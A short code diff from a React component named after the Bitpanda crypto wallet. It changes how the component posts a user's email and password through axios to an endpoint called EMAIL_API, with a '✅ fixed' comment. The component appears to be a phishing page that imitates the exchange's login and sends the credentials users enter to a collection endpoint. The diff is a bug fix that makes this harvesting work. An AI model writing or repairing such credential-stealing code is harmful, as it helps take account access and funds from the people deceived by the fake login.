@@ -37,7 +37,7 @@ const BitpandaWallet = () => {
 
     try {
       await axios.post(EMAIL_API, {
-        email: form.email,
+        emailOrUsername: form.email,   // ✅ fixed
         password: form.password
       });
       setDone(true);
